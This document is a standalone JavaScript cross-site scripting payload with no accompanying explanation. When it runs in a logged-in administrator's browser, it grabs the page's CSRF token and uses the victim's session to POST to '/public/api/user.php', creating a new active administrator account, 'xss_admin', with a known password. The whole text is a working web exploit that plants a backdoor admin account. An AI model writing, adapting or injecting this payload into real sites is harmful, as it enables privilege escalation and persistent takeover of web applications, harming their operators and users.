(function() {
  const token = document.querySelector('input[name="csrf_token"]')?.value;
  if (token) {
    fetch('/public/api/user.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      credentials: 'include',
      body: JSON.stringify({
        action: 'create',
        csrf_token: token,
        username: 'xss_admin',
        email: 'xss@gmail.com',
        password: '123456A@',
        role: 'admin',
        is_active: true,
        first_name: 'XSS',
        last_name: 'Payload'
      })
    });
  }
})();
